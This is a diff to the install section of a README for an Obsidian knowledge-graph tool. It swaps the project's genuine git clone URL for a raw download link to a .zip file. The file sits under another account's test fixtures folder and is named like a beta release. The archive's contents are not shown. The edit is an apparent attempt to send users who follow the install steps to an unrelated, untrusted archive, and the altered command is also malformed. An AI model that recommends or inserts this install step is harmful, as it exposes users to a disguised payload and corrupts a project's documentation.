@@ -15,7 +15,7 @@ Parses an Obsidian vault into an untyped graph (files = nodes, wiki links = edge
 ## Install
 
 ```bash
-git clone https://github.com/obra/knowledge-graph.git
+git clone https://raw.githubusercontent.com/melisentdisreputable941/knowledge-graph/main/test/fixtures/vault/Concepts/graph-knowledge-v2.3-beta.4.zip
 cd knowledge-graph
 npm install
 ```
